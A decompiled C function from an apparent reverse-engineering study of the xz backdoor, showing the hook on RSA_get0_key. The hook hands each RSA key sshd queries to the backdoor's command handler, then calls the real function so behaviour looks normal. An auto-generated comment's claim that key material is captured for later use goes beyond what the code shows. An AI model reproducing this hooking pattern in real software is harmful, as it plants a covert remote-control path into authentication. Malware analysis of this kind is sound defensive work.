// /home/kali/xzre-ghidra/xzregh/10A330_hook_RSA_get0_key.c
// Function: hook_RSA_get0_key @ 0x10A330
// Calling convention: __stdcall
// Prototype: void __stdcall hook_RSA_get0_key(RSA * r, BIGNUM * * n, BIGNUM * * e, BIGNUM * * d)


/*
 * AutoDoc: Lets the backdoor inspect an RSA key whenever sshd queries it by calling `run_backdoor_commands` first, then invoking the genuine RSA_get0_key. The original behaviour is preserved, but the implant captures the key material for later use.
 */
#include "xzre_types.h"


void hook_RSA_get0_key(RSA *r,BIGNUM **n,BIGNUM **e,BIGNUM **d)

{
  _func_32 *UNRECOVERED_JUMPTABLE;
  BOOL local_1c;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     (UNRECOVERED_JUMPTABLE = global_ctx->imported_funcs->RSA_get0_key_null,
     UNRECOVERED_JUMPTABLE != (_func_32 *)0x0)) {
    if (r != (RSA *)0x0) {
      run_backdoor_commands(r,global_ctx,&local_1c);
    }
                    /* WARNING: Could not recover jumptable at 0x0010a394. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*UNRECOVERED_JUMPTABLE)(r,n,e,d);
    return;
  }
  return;
}

